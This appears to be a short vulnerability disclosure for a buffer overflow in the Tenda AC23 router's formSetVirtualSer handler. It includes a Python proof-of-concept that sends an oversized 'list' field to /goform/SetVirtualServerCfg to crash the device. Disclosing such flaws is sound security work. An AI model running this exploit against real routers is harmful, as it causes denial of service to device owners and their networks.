A buffer overflow vulnerability in Tenda AC23 V16.03.07.52 occurs because the formSetVirtualSer function does not check the length of input data, which can be exploited by an attacker to launch a denial of service attack.

<img width="415" height="169" alt="image" src="https://github.com/user-attachments/assets/0cf72a60-79df-4f55-bfec-1ce3996f1897" />


POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/SetVirtualServerCfg"

cookie = {"Cookie":"password=12345"}
data = {"list": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
